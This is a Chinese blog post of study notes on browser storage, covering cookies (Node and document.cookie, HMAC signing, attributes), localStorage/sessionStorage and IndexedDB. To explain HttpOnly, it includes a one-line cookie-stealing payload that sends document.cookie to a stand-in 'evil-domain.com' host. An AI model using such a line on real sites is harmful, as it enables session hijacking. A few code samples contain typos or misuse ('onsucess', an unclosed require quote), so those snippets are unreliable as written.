---
title: "浏览器存储知识总结与实践"
date: 2018-01-24 07:59:09
tags:
toc: true
---


## 浏览器端操作cookie

cookie在chrome浏览器的控制台可以看到。

![](./cookie/1.png)

在浏览器端可以通过`document.cookie`来读取和设置cookie。

```javascript
document.cookie = 'key=value; domain=x; path=y; [expires|max-age]=z;'
```

## 通过Node操作cookie

Node通过`res.setHeader('Set-Cookie')`设置cookie。

- 设置httpOnly，前端获取不到，但是可以用浏览器修改，修改后也会发送给后台。
- `expires/max-age`设置后，浏览器每次刷新都会刷新过期时间。max-age是相对时间，expires是绝对时间。
- path一般都不会设置，默认是/，可以起到限制cookie访问的作用。
- domain: 默认只针对当前域名，可以设置为当前域名的上级域，.a.com表示a.a.com和b.a.com都可以共用cookie。

```javascript
// 设置一个cookie，写多次后面的setHeader会覆盖前面的
res.setHeader('Set-Cookie', 'name=zs')

// 设置多个cookie，使用数组
res.setHeader('Set-Cookie', ['name=zs', 'age=12'])
```

## cookie安全和加盐

- 因为前台可以修改cookie，需要防止它被篡改。
- cookie一般不要存敏感信息，因为可以直接看到它。
- 不要单纯使用md5生成它，因为有可能通过撞库(彩虹表)就可以破解。
- md5摘要算法，它是单向不可逆的，生成的字符串长度相同，不同的内容结果完全不同。

所以一般使用加盐对cookie进行签名加密。所谓的盐就是一个密钥。密钥一般使用ssl生成。

```javascript
const crypto = require('crypto)
const salt = 'eexxfjakfjldas';
crypto.createHmac('sha256',salt).update(value).digest('base64')
```



# Web storage和cookie

## 预习

- http://javascript.ruanyifeng.com/bom/webstorage.html

## 总结
1、localStorage和sessionStorage的区别？

- localStorage是永久存储，sessionStorage是窗口关闭时数据清空。
- 同时打开2个同域窗口，一个窗口设置的sessionStorage不影响另一个窗口的sessionStorage，而一个窗口设置的localStorage会影响另一个窗口的localStorage。


2、localStorage在各个浏览器中的储存大小，以及在firefox里的限制，同域限制？

Chrome是2.5MB，Firefox和Opera是5MB，IE是10MB。其中，Firefox的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，在Firefox中，a.example.com和b.example.com共享5MB的存储空间。另外，与Cookie一样，它们也受同域限制。

3、设置、读取、删除、清空的方法？

```javascript
// 设置
localStorage.setItem(key, value)
localStorage[key] = value

// 读取
localStorage.getItem(key)
localStorage[key]

// 删除某个字段
localStorage.removeItem(key)
delete localStorage[key]

// 清空
localStorage.clear()
```


4、如何遍历localStorage对象？

通过其length属性和key()方法。

```javascript
for(let i=0;i<localStorage.length;i++){
    console.log(localStorage.key(i))
}
```

5、storage事件的使用方法和注意事项？event对象的关键属性？

- event.key
- event.oldValue
- event.newValue
- event.url：storage改变的那个文档的url
- event.storageArea：被影响的storage对象

## 深入：web storage规范解读

- 原文：https://html.spec.whatwg.org/multipage/webstorage.html

web storage规范引入了2种和cookie相似的机制，用于客户端存储键值对数据。

1. sessionStorage，是为单个事务设计，可以在不同窗口执行多个事务。也就是说每个窗口的sessionStorage是独立的、互不影响。cookie就不能这样，它是同域公用的，一个窗口可以读取另一个窗口的cookie。

实例是用户打开2个窗口买票，如果用cookie可能会买2张相同的票。而使用sessionStorage只需要：

```html
<label>
 <input type="checkbox" onchange="sessionStorage.insurance = checked ? 'true' : ''">
  I want insurance on this trip.
</label>

if (sessionStorage.insurance) { ... }
```

因为每个窗口都有一个单独的sessionStorage，所以直接判断就行。

2. localStorage是为跨多窗口存储设计的，并且持续时间不只是当前会话，而且出于性能考虑，允许存储大容量数据，比如用户编写的文档。

同样，cookie不能很好处理这些问题。因为它们会随每次请求一起传输。

Storage接口

```javascript
[Exposed=Window]
interface Storage {
  readonly attribute unsigned long length;
  DOMString? key(unsigned long index);
  getter DOMString? getItem(DOMString key);
  setter void setItem(DOMString key, DOMString value);
  deleter void removeItem(DOMString key);
  void clear();
};
```

每个Storage对象都提供对键值对列表的访问，key可以是任意字符串，包括空字符串。值也是字符串。

- storage.length
- storage.key(n)：返回列表中第n个键的名称。n如果超出，则返回null
- value = storage.getItem(key) 或 value = storage[key]。没有则返回null
- storage.setItem(key, value) 或 storage[key] = value。如果用户禁止存储或超出大小限制，则设置可能错误，抛出DOMException异常。
- storage.removeItem(key) 或 delete storage[key]
- storage.clear() 

StorageEvent接口

```
[Exposed=Window,
 Constructor(DOMString type, optional StorageEventInit eventInitDict)]
interface StorageEvent : Event {
  readonly attribute DOMString? key;
  readonly attribute DOMString? oldValue;
  readonly attribute DOMString? newValue;
  readonly attribute USVString url;
  readonly attribute Storage? storageArea;
};

dictionary StorageEventInit : EventInit {
  DOMString? key = null;
  DOMString? oldValue = null;
  DOMString? newValue = null;
  USVString url = "";
  Storage? storageArea = null;
};
```

空间大小：建议5M，防止三级域名共享数据。

安全性
- dns欺骗攻击，不能保证是该域的主机，网页最好使用TLS，TLS可以确保只有用户、代表用户的软件及其他使用TLS的页面（同一个域的证书）可以访问器存储区域。
- 跨目录攻击，比如多人共享目录，xxx.com/a， xxx.com/b，应避免使用storage
- 浏览器必须要实现同源策略
- 小心第三方脚本的读取也写入









# indexedDB

## 预习
- [IndexedDB：浏览器端数据库](http://javascript.ruanyifeng.com/bom/indexeddb.html)
- [使用 IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API/Using_IndexedDB)
- [HTML5 进阶系列：indexedDB 数据库](https://zhuanlan.zhihu.com/p/26639553)
- [Working with IndexedDB](https://developers.google.com/web/ilt/pwa/working-with-indexeddb)
- [HTML5 indexedDB前端本地存储数据库实例教程](http://www.zhangxinxu.com/wordpress/2017/07/html5-indexeddb-js-example/)

> 学完后需要将张鑫旭的实例自己实战一番。否则会很懵逼。

## 总结

浏览器处理能力不断增强，越来越多的网站考虑将大量数据存在客户端。但是cookie和localStorage都不适合储存大量数据。

**1. indexeddb的特点？**

- 键值对存储，值可以是js对象;键是独一无二的，重复则报错。
- 异步读写，而localStorage是同步的。
- 支持事务：只要有一步失败，则整个事务取消。不存在只改写一部分数据的情况。
- 同域限制
- 存储空间大：一般不小于250m，chrome和opera是剩余空间的某个百分比，firefox没有上限。
- 支持二进制存储

**2. 几个概念**

**2. indexedDB简介？**

indexedDB是一个全局对象，它是IDBFactory的实例。

![](./img/indexDB.png)

可以看到，它有三个方法：cmp、deleteDatabase、open。

cmp用于比较两个键的大小，-1表示小于，0表示相等，1表示大于。

```javascript
indexedDB.cmp('a', 'b') // -1
indexedDB.cmp('a', 'a') // 0
indexedDB.cmp('ade', 'abc') // 1
```

open、deleteDatabase分别表示请求连接数据库和请求删除数据库。注意只是请求，和ajax的send方法一样，都是异步的。

**3. 创建数据库**

创建数据库使用open方法。

```
var openRequest = indexedDB.open('test', 1)
```

open方法有2个参数：第一个参数是数据库名称，第二个参数是数据库的版本号，如果不传，默认是1。如果数据库不存在，则会新建数据库。

open方法返回一个IDBOpenDBRequest对象。

![idb-open-db-request](./_img/idb-open-db-request.png)

上图可以看到，openRequest 有四个事件函数，分别是：

- onblocked：表示连接时，如果上次数据库连接还未关闭时触发
- onerror：打开数据库失败时触发
- onsuccess：打开数据库成功时触发
- onupgradeneeded：新建数据库或数据库版本升级时触发

下面是一个稍微完整的连接数据库的例子。

```javascript
var openRequest = indexedDB.open('test', 1)

openRequest.onsucess = function(e){
    console.log('onsucess')
    console.log('连接的数据库对象是db:', e.target.result)
}
openRequest.onerror = function(){
    console.log('onerror')
}
openRequest.onupgradeneeded = function(){
    console.log('onupgradeneeded')
}
```

上面的代码中，可以通过 e.target.result获取连接的数据库对象。

**4. 新建对象仓库**

在关系型数据库里，数据库建好后，就需要建表了。但是indexedDB里不叫表，叫"对象仓库"，其实它类似于表。

通过db.createObjectStore()可以创建对象仓库，如果对象仓库已经存在，会抛出一个错误。为了避免错误需要用db.objectStoreNames的contains方法来检测仓库是否存在。

```javascript
var openRequest = indexedDB.open('test', 1)

openRequest.onupgradeneeded = function(e){
    var db = e.target.result
    if(!db.objectStoreNames.contains('firstOS')){
        db.createObjectStore('firstOS', {autoIncrement: true})
    }
}
```

> 只能在onupgradeneeded事件里使用createObjectStore。如果在onsucess里使用createObjectStore，会报错`Failed to execute 'createObjectStore' on 'IDBDatabase': The database is not running a version change transaction`。

上面的代码，在onupgradeneeded事件里创建了一个名叫firstOS的对象仓库。onupgradeneeded事件是在新建数据库或数据库版本改变时触发，所以如果数据库存在，新建对象仓库时，必须增加版本号。

db.objectStoreNames返回一个DOMStringList对象，包含数据库所有对象仓库的名称。它的contains方法，可以检查数据库是否包含某个“对象仓库”。

db.createObjectStore()方法接受有2个参数，第一个是对象仓库的名称，第二个是键名的特征，keyPath指定用那个字段做键名，默认是null;autoIncrement表示以自动递增的整数做键名，默认是false。一般来说，keyPath和autoIncrement属性只要使用一个就够了，如果两个同时使用，表示键名为递增的整数，且对象不得缺少指定属性。

5. 操作数据

操作数据分为读、写、修改、删除数据。要操作数据，必须首先使用transaction()方法创建数据库事务。

```
var t = db.transaction(["firstOS"], "readwrite");
var store = t.objectStore("firstOS");
```

transaction()方法第一个参数是涉及的对象仓库数组，通常只有一个。第二个参数是表示操作类型的字符串，目前只支持readonly(读时用)和readwrite(写时用)两种。

transaction()也是异步的，。

```
abort：事务中断。
complete：事务完成。
error：事务出错。
```

要注意的是，在onupgradeneeded里面可以直接获取transaction，不能新建，否则报错。

```
openRequest.onupgradeneeded = function (e) {
	var db = e.target.result
	if (!db.objectStoreNames.contains("firstOS")) {
	    db.createObjectStore("firstOS");
	}

    // 错误：会抛出下面的错误
	// var transaction = db.transaction(['firstOS'], 'readwrite')

	// 正确
	var transaction = e.target.transaction
}
```

![transaction-error](./_img/transaction-error.png)

所以为了让代码清晰点，通常是在onupgradeneeded里创建对象仓库，在onsuccess里操作数据。

```
openRequest.onupgradeneeded = function (e) {
	var db = e.target.result
	if (!db.objectStoreNames.contains("firstOS")) {
	    db.createObjectStore("firstOS");
	}
}
openRequest.onsuccess = function (e) {
    console.log('Success', e.target)
    var transaction = e.target.result.transaction(['firstOS'], 'readwrite')
    var store = transaction.objectStore('firstOS');
    store.add({p: 123}, 1)
         .onsuccess(function(){
            console.log('添加数据成功')
         })
}
```

通过store对象可以操作数据，下面看store的几个方法：

- add(obj, key)：添加数据，key表示键名，如果创建数据仓库时设置了键，则可以不指定
- get(key)：通过key获取数据
- delete(key)：通过key删除数据
- openCursor()：创建一个指针，用于遍历数据仓库。
    - 第一个参数是一个Range对象，表示遍历的范围，需要通过IDBKeyRange创建，后面有介绍。
    - 第二个参数，表示遍历方向，默认值为next，其他可能的值为prev、nextunique和prevunique。后两个值表示如果遇到重复值，会自动跳过。

注意它们都是异步的，有onsuccess和onerror事件，下面是用法的实例：

```
// 添加数据：add()
var store = t.objectStore("firstOS");
var o = {p: 123};
var request = store.add(o,1);  // 1表示键名，如果创建数据仓库时，设置了键，则可以不指定
request.onerror = function(){}
request.onsuccess = function(){}

// 获取数据：get()
var t = db.transaction(["firstOS"], "readonly");
var store = t.objectStore("firstOS");
var ob = store.get(1);
ob.onsuccess = function(e){
    console.log(e.target.result) // {p: 123}
}

// 更新数据
var o = { p:456 };
var request = store.put(o, 1);

// 删除数据
var t = db.transaction(["people"], "readwrite");
var request = t.objectStore("people").delete(1);

// 遍历数据
var t = db.transaction(["test"], "readonly");
var store = t.objectStore("test");
var cursor = store.openCursor();  // 创建一个指针
cursor.onsuccess = function(e) {
    var res = e.target.result;
    if(res) {
        console.log("Key", res.key);
        console.dir("Data", res.value);
        res.continue(); // 指针向后移动，如果已经是最后一个，则光标执行null
    }
}

// 链式写法
db.transaction(["test"], "readonly")
  .objectStore("test")
  .get(X)
  .onsuccess = function(e){}
```

创建索引和读取数据
```
var store = db.createObjectStore("people", { autoIncrement:true });

store.createIndex("name","name", {unique:false});
store.createIndex("email","email", {unique:true});

var t = db.transaction(["people"],"readonly");
var store = t.objectStore("people");
var index = store.index("name");

var request = index.get(name);
```

6. 关于索引

索引的作用：
- 索引就像表的字段，用于数据的操作
- 指定读取数据的范围，可以通过IDBKeyRange对象创建Range对象。

下面是一个使用索引的例子：

```
var index = objectStore.index("name");
index.get("Donna").onsuccess = function(event) {
  alert("Donna's SSN is " + event.target.result.ssn);
};
```

Donna可能不止一个，它总是会获取键值最小的那个。

```
index.openCursor().onsuccess = function(event) {
  var cursor = event.target.result;
  if (cursor) {
    // cursor.key 是一个 name, 就像 "Bill", 然后 cursor.value 是整个对象。
    alert("Name: " + cursor.key + ", SSN: " + cursor.value.ssn + ", email: " + cursor.value.email);
    cursor.continue();
  }
};

index.openKeyCursor().onsuccess = function(event) {
  var cursor = event.target.result;
  if (cursor) {
    // cursor.key 是一个 name, 就像 "Bill", 然后 cursor.value 是那个 SSN。
    // 没有办法可以得到存储对象的其余部分。
    alert("Name: " + cursor.key + ", SSN: " + cursor.value);
    cursor.continue();
  }
};
```

IDBKeyRange对象的作用是生成一个表示范围的Range对象。

![IDBKeyRange](./_img/IDBKeyRange.png)

它有四个方法可以生成Range，分别是:
- lowerBound()：指定范围的下限
- upperBound()：指定范围的上限
- bound():指定范围的上下限
- only：指定范围只有一个值

```
// 小于3，第二个参数true表示不包含等于，默认是false，表示<=3
// IDBKeyRange{lower: undefined, lowerOpen: true, upper : 3, upperOpen: true }
var r1 = IDBKeyRange.upperBound(3, true)

var r6 = IDBKeyRange.bound(x, y, true, true);

// 只有3
// {lower: 3, upper: 3, lowerOpen: false, upperOpen: false}
var r2 = IDBKeyRange.only(3)
```

可以用Range对象作为openCursor()方法的参数，读取指定范围的数据。

```
var t = db.transaction(["people"],"readonly");
var store = t.objectStore("people");
var index = store.index("name");

var range = IDBKeyRange.bound('B', 'D');

index.openCursor(range).onsuccess = function(e) {
    var cursor = e.target.result;
    if(cursor) {
        console.log(cursor.key + ":");
        for(var field in cursor.value) {
            console.log(cursor.value[field]);
        }
        cursor.continue();
    }
}
```

常用的存储库：

- [localForage](https://github.com/localForage/localForage)

## 深入学习

- [mdn IndexedDB API](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API)
- [w3 indexedDB](https://www.w3.org/TR/IndexedDB-2/)























# cookie

## 学习资料

- [mdn http cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [cookie百度百科](https://baike.baidu.com/item/cookie/1119?fr=aladdin)
- [阮一峰cookie](http://javascript.ruanyifeng.com/bom/cookie.html)



## 总结

**1. 为什么要有cookie？**

因为http是无状态的，即使用户登陆后，它还是不知道用户是否已经登录。服务端可以通过cookie保存用户信息到客户端，客户端发请求时总是会附带上这段信息。

**2. cookie的常用场景？**

- 对话管理：保存登录、购物车等信息
- 个性化：主题、字体、背景色
- 追踪：记录和分析用户行为

**3. cookie的特点？**

- 容量小、保存的个数有限制：不同浏览器不一样，一般是小于4kb，个数不超过30个。超出后cookie将被忽略，不会被设置。
- 域名、端口相同，则可以共享cookie，注意不要求协议相同。

**4. cookie的属性有哪些？**

- Expires：cookie的过期时间，过期后，浏览器将删除这个cookie。它的值是UTC格式。可以使用Date.prototype.toUTCString()转换格式。如果不设置设个属性或设为null，则是session cookie。另外浏览器是根据本地时间决定cookie是否过期，所以cookie没办法保证是在服务器指定时间过期。

```javascript
document.cookie = 'age=12;expires=' + new Date('2019-9-1')
// "age=12;expires=Sun Sep 01 2019 00:00:00 GMT+0800 (CST)"

// 要加时区才行
document.cookie = 'age=12;expires=' + new Date('2019-9-1').toUTCString()
// "age=12;expires=Sat, 31 Aug 2019 16:00:00 GMT"
```

- Max-age：从现在开始过多少秒后cookie过期，比如一年是`60 * 60 * 24 * 365`。如果同时指定了Expires和Max-Age，则Max-Age优先。如果没有指定，则是session cookie。
- Domain：指定发http请求时，哪些域名要附带这个cookie，如果没有指定，则默认是当前的一级域名，比如www.xx.com 会设为xx.com。所以访问xx.com的任何子域，http请求都会带这个cookie。如果Domain不属于当前域名，浏览器会拒绝这个cookie。当前发送 Cookie 的域名的一部分。
- Path：Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致，是绝对路径。
- Secure：只能服务端写入。https下才会发送cookie。如果是http，浏览器会忽略从服务端发送来的Secure属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。
- HttpOnly：只能服务端写入。指定该 Cookie 无法通过 JavaScript 脚本拿到。通过document.cookie、XMLHttpRequest对象和Request API都获取不到，只有浏览器发出http请求时，才会带上该Cookie，该属性可以防止第三方恶意代码获取cookie。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

**5. 服务端操作cookie**

服务端要设置cookie，需要在http头里设置`Set-Cookie`字段，可以包含多个。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

除了值之外，还可以附加cookie的属性，一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。

```
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly

// 包括多个属性
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。

```
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。

```
Set-Cookie: key1=value2; domain=example.com; path=/blog
```

只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
Set-Cookie: key1=value2; domain=example.com; path=/
上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。

```
Cookie: key1=value1; key1=value2
```

上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。


**6、客户端操作cookie**

客户端发送请求时，每次都会把cookie放在http头的Cookie字段中发送给服务端。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: name=zhangsan1; age=12; Webstorm-dbb44fa0=e4a0db2b-0f80-47e9-acd1-4688f2e4ace9; optimizelyEndUserId=oeu1508308702253r0.1659170844255642;
```

服务端收到cookie后，无法知道cookie的过期时间，可cookie是哪个域名设置的，一级还是二级。

通过document.cookie可以获取cookie。注意，需要以服务器网页方式打开，不能以本地`file://`形式。

```javascript
document.cookie   // "name=zs;age=12"
```

![](./_img/getcookie.png)

设置cookie，注意等号两边不要有空格，而且必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用encodeURIComponent方法做到。

document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。


```javascript
// 设置cookie
document.cookie = encodeURIComponent('username') + '=' + encodeURIComponent('jero')

// 删除cookie,通过设置过期时间
document.cookie = encodeURIComponent('username') + '=' +
                  encodeURIComponent('cover') + 
                  ';domain=ke.qq.com' + 
                  ';expires=' + new Date(0)  // 1970.1.1
```

cookie的属性一旦设置，就不能读取，比如上面代码中读取不到expires和domain。

可以使用`[js-cookie](https://github.com/js-cookie/js-cookie)`库来简单的进行操作。

**7、禁用cookie**

浏览器如果禁用了cookie，则不能再设置cookie，请求也不再向服务器发送cookie。查看cookie是否被禁用，可以通过`navigator.cookieEnabled`，它是只读的。

chrome禁用cookie的方法是，`设置 -> 内容设置 -> cookie`。禁用后`navigator.cookieEnabled`的返回值是false。此时之前设置的cookie不动，之后不能再操作cookie了（读取、新增、修改、删除都不行）。如果再启用cookie，之前设置的cookie还是有效的。

cookie分为临时cookie（session cookie）和持久cookie，没有设置过期时间的是临时cookie，浏览器关闭时自动清除。

3、domain可以设置成上级的域名，比如三级域名设置成2级域名
4、path，如果设置了path，只有在那个path才有这个cookie，其它path没有
5、在请求数据时，cookie会自动带上
6、cookie出现的原因是http是无状态的，不知道用户是否登录。
7、客户端和服务端都能读取和操作cookie。

**8. 什么是签名cookie？**

## 深入

- [http state management mechanism](https://tools.ietf.org/html/rfc6265)
